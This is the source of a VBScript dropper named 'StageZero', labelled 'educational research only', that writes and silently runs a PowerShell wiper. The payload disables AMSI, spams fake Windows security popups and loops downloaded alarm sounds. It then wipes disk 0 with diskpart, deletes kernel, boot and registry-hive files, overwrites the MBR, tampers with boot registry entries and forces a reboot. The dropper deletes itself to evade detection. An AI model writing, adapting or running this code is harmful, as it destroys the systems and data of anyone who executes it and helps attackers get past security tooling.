' StageZero.vbs - Polymorphic Destructive Payload
' Educational research only - Author: CATShadow

Option Explicit
Dim fso, shell, wmi, tempPath, psScript, randName, timer

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Wscript.Shell")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")

' Generate random names to avoid static detection
Randomize
randName = "SysUpdate_" & Int(Rnd * 10000) & ".ps1"

' Phase 1: Delay 10 seconds using WMI timer
Set timer = wmi.Get("__IntervalTimerInstruction")
timer.TimerId = "StageZeroDelay"
timer.IntervalBetweenEvents = 10000 ' 10 seconds
timer.Put_

' Phase 2: Write polymorphic PowerShell payload
psScript = tempPath & "\" & randName
Call WritePayload(psScript)

' Phase 3: Execute with AMSI bypass and hidden window
shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File """ & psScript & """", 0, False

Sub WritePayload(filePath)
    Dim payload, stream
    payload = "// CATShadow Destructive Payload - Educational Use Only" & vbCrLf
    payload = payload & "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);" & vbCrLf
    payload = payload & "Start-Sleep -Seconds 10;" & vbCrLf
    
    ' Stage 1: Popup spam
    payload = payload & "for($i=0; $i -lt 50; $i++) {" & vbCrLf
    payload = payload & "    $msgBox = New-Object -ComObject Wscript.Shell;" & vbCrLf
    payload = payload & "    $msgBox.Popup('SYSTEM CRITICAL ERROR #' + $i + '`nMEMORY CORRUPTION DETECTED`nCONTACT ADMINISTRATOR', 0, 'WINDOWS SECURITY ALERT', 16);" & vbCrLf
    payload = payload & "    Start-Sleep -Milliseconds 100;" & vbCrLf
    payload = payload & "}" & vbCrLf
    
    ' Stage 2: Loud alarm sounds
    payload = payload & "$alarmFiles = @('https://filesamples.com/samples/audio/mp3/sample3.mp3', 'https://filesamples.com/samples/audio/wav/sample1.wav');" & vbCrLf
    payload = payload & "$webClient = New-Object System.Net.WebClient;" & vbCrLf
    payload = payload & "foreach($url in $alarmFiles) {" & vbCrLf
    payload = payload & "    try {" & vbCrLf
    payload = payload & "        $tempFile = $env:TEMP + '\alarm_' + [System.IO.Path]::GetFileName($url);" & vbCrLf
    payload = payload & "        $webClient.DownloadFile($url, $tempFile);" & vbCrLf
    payload = payload & "        $soundPlayer = New-Object System.Media.SoundPlayer;" & vbCrLf
    payload = payload & "        $soundPlayer.SoundLocation = $tempFile;" & vbCrLf
    payload = payload & "        $soundPlayer.PlayLooping();" & vbCrLf
    payload = payload & "    } catch {}" & vbCrLf
    payload = payload & "}" & vbCrLf
    
    ' Stage 3: System destruction using legitimate Windows tools
    payload = payload & "Start-Sleep -Seconds 5;" & vbCrLf
    
    ' Method A: Corrupt boot sector via diskpart
    payload = payload & "if([Environment]::Is64BitOperatingSystem) {" & vbCrLf
    payload = payload & "    $diskpartScript = @'" & vbCrLf
    payload = payload & "select disk 0" & vbCrLf
    payload = payload & "clean" & vbCrLf
    payload = payload & "create partition primary" & vbCrLf
    payload = payload & "format fs=ntfs quick" & vbCrLf
    payload = payload & "active" & vbCrLf
    payload = payload & "'@;" & vbCrLf
    payload = payload & "    $diskpartScript | Out-File $env:TEMP\bootkill.txt;" & vbCrLf
    payload = payload & "    Start-Process -WindowStyle Hidden diskpart -ArgumentList '/s $env:TEMP\bootkill.txt';" & vbCrLf
    payload = payload & "}" & vbCrLf
    
    ' Method B: Delete critical system files
    payload = payload & "$criticalPaths = @(" & vbCrLf
    payload = payload & "    '$env:windir\System32\ntoskrnl.exe'," & vbCrLf
    payload = payload & "    '$env:windir\System32\winload.exe'," & vbCrLf
    payload = payload & "    '$env:windir\System32\bootres.dll'," & vbCrLf
    payload = payload & "    '$env:windir\System32\config\SYSTEM'," & vbCrLf
    payload = payload & "    '$env:windir\System32\drivers\*.sys'" & vbCrLf
    payload = payload & ");" & vbCrLf
    payload = payload & "foreach($path in $criticalPaths) {" & vbCrLf
    payload = payload & "    try {" & vbCrLf
    payload = payload & "        Get-ChildItem $path -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse;" & vbCrLf
    payload = payload & "    } catch {}" & vbCrLf
    payload = payload & "}" & vbCrLf
    
    ' Method C: MBR overwrite using raw disk access
    payload = payload & "$mbrCode = [Byte[]]@(0x90)*512;" & vbCrLf
    payload = payload & "try {" & vbCrLf
    payload = payload & "    $stream = [System.IO.File]::OpenWrite('\\.\PhysicalDrive0');" & vbCrLf
    payload = payload & "    $stream.Write($mbrCode, 0, $mbrCode.Length);" & vbCrLf
    payload = payload & "    $stream.Close();" & vbCrLf
    payload = payload & "} catch {}" & vbCrLf
    
    ' Method D: Registry corruption
    payload = payload & "reg add 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' /v BootExecute /t REG_MULTI_SZ /d 'autocheck autochk * /r' /f;" & vbCrLf
    payload = payload & "reg add 'HKLM\BCD00000000\Objects\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\Elements\12000004' /v Element /t REG_BINARY /d '0100' /f;" & vbCrLf
    
    ' Method E: Force immediate reboot to make destruction effective
    payload = payload & "Start-Sleep -Seconds 3;" & vbCrLf
    payload = payload & "shutdown /r /f /t 0;" & vbCrLf
    
    payload = payload & "// End of payload" & vbCrLf
    
    Set stream = fso.CreateTextFile(filePath, True)
    stream.Write payload
    stream.Close
End Sub

' Self-delete the VBScript after execution
fso.DeleteFile WScript.ScriptFullName
